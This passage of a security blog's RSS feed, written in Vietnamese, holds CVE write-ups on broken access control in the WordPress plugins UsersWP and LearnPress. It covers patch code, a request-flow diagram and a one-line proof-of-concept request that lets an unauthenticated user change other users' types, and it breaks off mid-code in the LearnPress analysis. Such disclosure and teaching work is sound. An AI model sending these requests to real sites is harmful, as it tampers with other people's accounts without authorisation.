disabled&#34;&gt;&#xA;  &lt;div class=&#34;details-summary admonition-title&#34;&gt;&lt;i class=&#34;icon fa-fw fa-solid fa-bug&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;L·ªói&lt;/div&gt;&#xA;  &lt;div class=&#34;details-content&#34;&gt;&#xA;    &lt;div class=&#34;admonition-content&#34;&gt;&lt;p&gt;&lt;strong&gt;L·ªó h·ªïng ph√°t sinh do kh√¥ng th·ª±c hi·ªán b·∫•t k·ª≥ ki·ªÉm tra quy·ªÅn (capability/permission) n√†o.&lt;/strong&gt; ƒêi·ªÅu n√†y cho ph√©p m·ªçi ng∆∞·ªùi d√πng ‚Äì k·ªÉ c·∫£ kh√¥ng c√≥ quy·ªÅn qu·∫£n tr·ªã ‚Äì g·ªçi v√†o endpoint v√† th·ª±c hi·ªán thay ƒë·ªïi User Type cho user b·∫•t k·ª≥, d√π h√†nh ƒë·ªông ƒë√≥ l·∫Ω ra ch·ªâ d√†nh cho admin.&lt;/p&gt;&lt;/div&gt;&#xA;  &lt;/div&gt;&#xA;&lt;/div&gt;&lt;p&gt;&lt;strong&gt;B·∫£n v√° (v1.2.48):&lt;/strong&gt; b·ªï sung v√†o h√†m &lt;code&gt;handle_bulk_user_type_change&lt;/code&gt;:&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;Ki·ªÉm tra nonce: H√†m y√™u c·∫ßu &lt;code&gt;_wpnonce&lt;/code&gt; ph·∫£i t·ªìn t·∫°i v√† h·ª£p l·ªá v·ªõi action &lt;code&gt;&#39;bulk-users&#39;&lt;/code&gt;.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;pre&gt;&lt;code&gt;if ( ! isset( $_GET[&amp;#39;_wpnonce&amp;#39;] ) || ! wp_verify_nonce( $_GET[&amp;#39;_wpnonce&amp;#39;], &amp;#39;bulk-users&amp;#39; ) ) {&#xA;    wp_die( __( &amp;#39;Security check failed. Please try again.&amp;#39; ) );&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;ul&gt;&#xA;&lt;li&gt;Ki·ªÉm tra quy·ªÅn: Ch·ªâ nh·ªØng user c√≥ capability &lt;code&gt;edit_users&lt;/code&gt; m·ªõi ƒë∆∞·ª£c ph√©p th·ª±c hi·ªán thao t√°c.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;pre&gt;&lt;code&gt;if ( ! current_user_can( &amp;#39;edit_users&amp;#39; ) ) {&#xA;    wp_die( __( &amp;#39;You do not have permission to perform this action.&amp;#39; ) );&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2025-12-12-cve-2025-66072/diff.png&#34; title=&#34;Diff code&#34; data-thumbnail=&#34;/posts/2025-12-12-cve-2025-66072/diff.png&#34; data-sub-html=&#34;&lt;h2&gt;Diff&lt;/h2&gt;&lt;p&gt;Diff code&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-12-12-cve-2025-66072/diff.png&#39; alt=&#34;Diff&#34; height=&#34;568&#34; width=&#34;1865&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;Diff code&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;flow&#34;&gt;&lt;span&gt;Flow&lt;/span&gt;&#xA;  &lt;a href=&#34;#flow&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;pre&gt;&lt;code&gt;graph TD&#xA;A[&amp;#34;Any user (including Unauthenticated)&amp;#34;] --&amp;gt; B[&amp;#34;Send request to admin-ajax.php or admin-post.php with uwp_change_user_type &amp;#43; uwp_new_user_type&amp;#34;]&#xA;B --&amp;gt; C[&amp;#34;Hook admin_init is triggered&amp;#34;]&#xA;C --&amp;gt; D[&amp;#34;Callback handle_bulk_user_type_change() executes&amp;#34;]&#xA;D --&amp;gt; E{&amp;#34;Are required GET parameters present?&amp;#34;}&#xA;E -- No --&amp;gt; F[&amp;#34;Function exits&amp;#34;]&#xA;E -- Yes --&amp;gt; G[&amp;#34;Retrieve uwp_new_user_type from $_GET&amp;#34;]&#xA;G --&amp;gt; H{&amp;#34;Is uwp_new_user_type a valid integer?&amp;#34;}&#xA;H -- No --&amp;gt; F&#xA;H -- Yes --&amp;gt; I[&amp;#34;Retrieve users list from $_REQUEST[&amp;#39;users&amp;#39;]&amp;#34;]&#xA;I --&amp;gt; J{&amp;#34;Is users list not empty?&amp;#34;}&#xA;J -- No --&amp;gt; F&#xA;J -- Yes --&amp;gt; K[&amp;#34;update_user_meta() for each user in the list&amp;#34;]&#xA;K --&amp;gt; L[&amp;#34;Redirect to users.php?user_type_updated=true&amp;#34;]&#xA;L --&amp;gt; M[&amp;#34;User Type changed without any capability check&amp;#34;]&lt;/code&gt;&lt;/pre&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;proof-of-concept-poc&#34;&gt;&lt;span&gt;Proof of Concept (PoC)&lt;/span&gt;&#xA;  &lt;a href=&#34;#proof-of-concept-poc&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;G·ª≠i request v·ªõi Unauthenticated user:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;GET /wp-admin/admin-post.php?uwp_change_user_type=2&amp;amp;uwp_new_user_type=user_type_id&amp;amp;users[]=uid_1&amp;amp;users[]=uid_2 HTTP/1.1&#xA;Host: localhost&lt;/code&gt;&lt;/pre&gt;&lt;h2 class=&#34;heading-element&#34; id=&#34;conclusion&#34;&gt;&lt;span&gt;Conclusion&lt;/span&gt;&#xA;  &lt;a href=&#34;#conclusion&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;CVE-2025-66072 ph√°t sinh t·ª´ vi·ªác &lt;strong&gt;thi·∫øu ki·ªÉm tra ·ªßy quy·ªÅn&lt;/strong&gt; trong h√†m &lt;code&gt;handle_bulk_user_type_change()&lt;/code&gt; c·ªßa UsersWP &amp;lt;= 1.2.47. ƒêi·ªÅu n√†y cho ph√©p &lt;strong&gt;m·ªçi ng∆∞·ªùi d√πng, k·ªÉ c·∫£ ng∆∞·ªùi d√πng ch∆∞a ƒëƒÉng nh·∫≠p&lt;/strong&gt;, thay ƒë·ªïi User Type c·ªßa c√°c user kh√°c b·∫±ng c√°ch g·ª≠i request ƒë∆∞·ª£c t·∫°o ƒë·∫∑c bi·ªát t·ªõi &lt;code&gt;admin-ajax.php&lt;/code&gt; ho·∫∑c &lt;code&gt;admin-post.php&lt;/code&gt;. B·∫£n v√° trong phi√™n b·∫£n 1.2.48 ƒë√£ kh·∫Øc ph·ª•c l·ªó h·ªïng b·∫±ng c√°ch b·ªï sung &lt;strong&gt;ki·ªÉm tra nonce&lt;/strong&gt; v√† &lt;strong&gt;ki·ªÉm tra capability&lt;/strong&gt;, gi·ªõi h·∫°n h√†nh ƒë·ªông ch·ªâ cho nh·ªØng user ƒë∆∞·ª£c ph√©p.&lt;/p&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;key-takeaways&#34;&gt;&lt;span&gt;Key Takeaways&lt;/span&gt;&#xA;  &lt;a href=&#34;#key-takeaways&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;ul&gt;&#xA;&lt;li&gt;Lu√¥n th·ª±c hi·ªán &lt;strong&gt;ki·ªÉm tra capability&lt;/strong&gt; (&lt;code&gt;current_user_can&lt;/code&gt;) khi thao t√°c v·ªõi c√°c ch·ª©c nƒÉng nh·∫°y c·∫£m trong WordPress.&lt;/li&gt;&#xA;&lt;li&gt;S·ª≠ d·ª•ng &lt;strong&gt;nonce&lt;/strong&gt; ƒë·ªÉ ngƒÉn ch·∫∑n c√°c request gi·∫£ m·∫°o ho·∫∑c kh√¥ng ƒë∆∞·ª£c ph√©p.&lt;/li&gt;&#xA;&lt;li&gt;Kh√¥ng ch·ªâ d·ª±a v√†o hook nh∆∞ &lt;code&gt;admin_init&lt;/code&gt;; ƒë·∫£m b·∫£o m·ªçi endpoint c√¥ng khai ƒë·ªÅu &lt;strong&gt;x√°c th·ª±c quy·ªÅn&lt;/strong&gt; v√† &lt;strong&gt;t√≠nh h·ª£p ph√°p c·ªßa request&lt;/strong&gt;.&lt;/li&gt;&#xA;&lt;li&gt;Ng∆∞·ªùi d√πng v·ªõi quy·ªÅn th·∫•p ho·∫∑c ch∆∞a ƒëƒÉng nh·∫≠p c√≥ th·ªÉ khai th√°c endpoint n·∫øu ki·ªÉm so√°t truy c·∫≠p kh√¥ng ƒë·∫ßy ƒë·ªß.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;references&#34;&gt;&lt;span&gt;References&lt;/span&gt;&#xA;  &lt;a href=&#34;#references&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;&lt;a href=&#34;https://patchstack.com/academy/wordpress/vulnerabilities/broken-access-control/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;Broken Access Control&lt;/a&gt;&lt;/p&gt;&#xA;&lt;p&gt;&lt;a href=&#34;https://patchstack.com/database/wordpress/plugin/userswp/vulnerability/wordpress-userswp-plugin-1-2-47-broken-access-control-vulnerability&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;WordPress UsersWP Plugin &amp;lt;= 1.2.47 is vulnerable to Broken Access Control&lt;/a&gt;&lt;/p&gt;</description>
    </item>
    <item>
      <title>CVE-2025-11368 Analysis &amp; POC</title>
      <link>http://localhost:1313/vi/posts/2025-12-11-cve-2025-11368/</link>
      <pubDate>Thu, 11 Dec 2025 19:00:00 +0700</pubDate><author>w41bu1@gmail.com (Bui Van Y)</author>
      <guid>http://localhost:1313/vi/posts/2025-12-11-cve-2025-11368/</guid>
      <category domain="http://localhost:1313/vi/categories/cve-analysis/">CVE Analysis</category>
      <description>&lt;img src=&#34;http://localhost:1313/posts/2025-12-11-cve-2025-11368/app.jpg&#34; alt=&#34;featured image&#34; referrerpolicy=&#34;no-referrer&#34;&gt;&lt;h2 class=&#34;heading-element&#34; id=&#34;cve--basic-info&#34;&gt;&lt;span&gt;CVE &amp;amp; Basic Info&lt;/span&gt;&#xA;  &lt;a href=&#34;#cve--basic-info&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;Plugin &lt;strong&gt;LearnPress ‚Äì WordPress LMS Plugin&lt;/strong&gt; cho &lt;strong&gt;WordPress&lt;/strong&gt; t·ªìn t·∫°i l·ªó h·ªïng &lt;strong&gt;Sensitive Information Disclosure&lt;/strong&gt; trong t·∫•t c·∫£ c√°c phi√™n b·∫£n cho ƒë·∫øn, v√† bao g·ªìm, &lt;strong&gt;4.2.9.4&lt;/strong&gt;. Nguy√™n nh√¢n l√† do thi·∫øu &lt;strong&gt;capability checks&lt;/strong&gt; trong &lt;strong&gt;REST endpoint&lt;/strong&gt; &lt;strong&gt;/wp-json/lp/v1/load_content_via_ajax&lt;/strong&gt; cho ph√©p th·ª±c thi &lt;strong&gt;arbitrary callback&lt;/strong&gt; c·ªßa c√°c &lt;strong&gt;admin-only template methods&lt;/strong&gt;. ƒêi·ªÅu n√†y khi·∫øn &lt;strong&gt;unauthenticated attackers&lt;/strong&gt; c√≥ th·ªÉ l·∫•y ƒë∆∞·ª£c &lt;strong&gt;admin curriculum HTML&lt;/strong&gt;, &lt;strong&gt;quiz questions with correct answers&lt;/strong&gt;, &lt;strong&gt;course materials&lt;/strong&gt;, v√† c√°c &lt;strong&gt;sensitive educational content&lt;/strong&gt; kh√°c th√¥ng qua &lt;strong&gt;REST API endpoint&lt;/strong&gt; n·∫øu h·ªç cung c·∫•p ƒë∆∞·ª£c &lt;strong&gt;valid numeric IDs&lt;/strong&gt;.&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;strong&gt;CVE ID&lt;/strong&gt;: &lt;a href=&#34;https://www.cve.org/CVERecord?id=CVE-2025-11368&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;CVE-2025-11368&lt;/a&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Vulnerability Type&lt;/strong&gt;: Broken Access Control&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Affected Versions&lt;/strong&gt;: &amp;lt;= 4.2.9.4&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Patched Versions&lt;/strong&gt;: 4.3.0&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;CVSS severity&lt;/strong&gt;: Low (5.3)&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Required Privilege&lt;/strong&gt;: Unauthenticated&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Product&lt;/strong&gt;: &lt;a href=&#34;https://wordpress.org/plugins/learnpress/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;WordPress LearnPress Plugin&lt;/a&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;requirements&#34;&gt;&lt;span&gt;Requirements&lt;/span&gt;&#xA;  &lt;a href=&#34;#requirements&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;ul&gt;&#xA;&lt;li&gt;&lt;strong&gt;Local WordPress &amp;amp; Debugging&lt;/strong&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;a href=&#34;https://w41bu1.github.io/posts/2025-08-21-wordpress-local-and-debugging/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;Virtual Machine&lt;/a&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;a href=&#34;https://w41bu1.github.io/posts/2025-10-22-wordpress-local-and-debugging-docker/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;Docker&lt;/a&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Plugin Version&lt;/strong&gt; - &lt;strong&gt;LearnPress&lt;/strong&gt;:&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;code&gt;4.2.9.4&lt;/code&gt; ‚Äì &lt;strong&gt;vulnerable&lt;/strong&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;code&gt;4.3.0&lt;/code&gt; ‚Äì &lt;strong&gt;patched&lt;/strong&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Diff Tool (diff)&lt;/strong&gt; ‚Üí &lt;a href=&#34;https://meldmerge.org/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;&lt;strong&gt;Meld&lt;/strong&gt;&lt;/a&gt; ho·∫∑c b·∫•t k·ª≥ c√¥ng c·ª• diff n√†o.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;analysis&#34;&gt;&lt;span&gt;Analysis&lt;/span&gt;&#xA;  &lt;a href=&#34;#analysis&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;Plugin ƒë√£ ƒëƒÉng k√Ω REST API:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;class LP_REST_AJAX_Controller extends LP_Abstract_REST_Controller {&#xA;&#x9;public function __construct() {&#xA;&#x9;&#x9;$this-&amp;gt;namespace = &amp;#39;lp/v1&amp;#39;;&#xA;&#x9;&#x9;$this-&amp;gt;rest_base = &amp;#39;load_content_via_ajax&amp;#39;;&#xA;&#xA;&#x9;&#x9;parent::__construct();&#xA;&#x9;}&#xA;&#xA;&#x9;public function register_routes() {&#xA;&#x9;&#x9;$this-&amp;gt;routes = array(&#xA;&#x9;&#x9;&#x9;&amp;#39;/&amp;#39; =&amp;gt; array(&#xA;&#x9;&#x9;&#x9;&#x9;array(&#xA;&#x9;&#x9;&#x9;&#x9;&#x9;&amp;#39;methods&amp;#39;             =&amp;gt; WP_REST_Server::ALLMETHODS,&#xA;&#x9;&#x9;&#x9;&#x9;&#x9;&amp;#39;callback&amp;#39;            =&amp;gt; array( $this, &amp;#39;get_content&amp;#39; ),&#xA;&#x9;&#x9;&#x9;&#x9;&#x9;&amp;#39;permission_callback&amp;#39; =&amp;gt; &amp;#39;__return_true&amp;#39;,&#xA;&#x9;&#x9;&#x9;&#x9;),&#xA;&#x9;&#x9;&#x9;),&#xA;&#x9;&#x9;);&#xA;&#xA;&#x9;&#x9;parent::register_routes();&#xA;&#x9;}&#xA;  ...&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Trong ƒëo·∫°n m√£ tr√™n, &lt;strong&gt;class LP_REST_AJAX_Controller&lt;/strong&gt; k·∫ø th·ª´a t·ª´ &lt;strong&gt;LP_Abstract_REST_Controller&lt;/strong&gt; v√† ƒë∆∞·ª£c s·ª≠ d·ª•ng ƒë·ªÉ ƒëƒÉng k√Ω m·ªôt &lt;strong&gt;REST API endpoint&lt;/strong&gt; cho plugin &lt;strong&gt;LearnPress&lt;/strong&gt;.&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;&lt;strong&gt;__construct()&lt;/strong&gt;:&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;Thi·∫øt l·∫≠p &lt;strong&gt;namespace&lt;/strong&gt; l√† &lt;code&gt;lp/v1&lt;/code&gt;.&lt;/li&gt;&#xA;&lt;li&gt;Thi·∫øt l·∫≠p &lt;strong&gt;rest_base&lt;/strong&gt; l√† &lt;code&gt;load_content_via_ajax&lt;/code&gt;.&lt;/li&gt;&#xA;&lt;li&gt;G·ªçi l·∫°i &lt;strong&gt;parent::__construct()&lt;/strong&gt; ƒë·ªÉ k·∫ø th·ª´a c√°c thi·∫øt l·∫≠p t·ª´ l·ªõp cha.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;&lt;strong&gt;register_routes()&lt;/strong&gt;:&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;Khai b√°o m·ªôt route &lt;code&gt;/&lt;/code&gt; v·ªõi c√°c ƒë·∫∑c ƒëi·ªÉm:&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;strong&gt;methods&lt;/strong&gt;: ch·∫•p nh·∫≠n t·∫•t c·∫£ c√°c ph∆∞∆°ng th·ª©c HTTP (&lt;strong&gt;WP_REST_Server::ALLMETHODS&lt;/strong&gt;).&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;callback&lt;/strong&gt;: g·ªçi h√†m &lt;code&gt;get_content&lt;/code&gt;.&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;permission_callback&lt;/strong&gt;: lu√¥n tr·∫£ v·ªÅ &lt;code&gt;true&lt;/code&gt;, t·ª©c l√† &lt;strong&gt;kh√¥ng c√≥ ki·ªÉm tra quy·ªÅn h·∫°n&lt;/strong&gt;.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;Sau ƒë√≥ g·ªçi l·∫°i &lt;strong&gt;parent::register_routes()&lt;/strong&gt; ƒë·ªÉ ho√†n t·∫•t vi·ªác ƒëƒÉng k√Ω.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;pre&gt;&lt;code&gt;public function register_routes() {&#xA;  if ( ! $this-&amp;gt;routes ) {&#xA;    return;&#xA;  }&#xA;&#xA;  foreach ( $this-&amp;gt;routes as $key =&amp;gt; $args ) {&#xA;    $rest_base = $this-&amp;gt;rest_base;&#xA;    $override  = false;&#xA;&#xA;    if ( is_bool( end( $args ) ) ) {&#xA;      $override = array_pop( $args );&#xA;    }&#xA;&#xA;    if ( ! is_numeric( $key ) ) {&#xA;      $rest_base = &amp;#34;{$rest_base}/{$key}&amp;#34;;&#xA;    }&#xA;&#xA;    register_rest_route( $this-&amp;gt;namespace, &amp;#39;/&amp;#39; . $rest_base, $args, $override );&#xA;  